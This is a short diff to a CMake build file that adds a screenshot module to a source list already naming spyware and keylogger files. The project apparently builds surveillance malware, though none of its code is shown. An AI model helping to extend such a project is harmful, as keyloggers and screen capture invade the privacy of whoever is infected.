@@ -10,6 +10,7 @@ set ( SOURCES
     core/authentication.cpp
     core/spyware.cpp
     loggers/keylogger.cpp
+    loggers/screenshot.cpp
 )
 
 add_executable (${PROJECT_NAME} ${SOURCES})
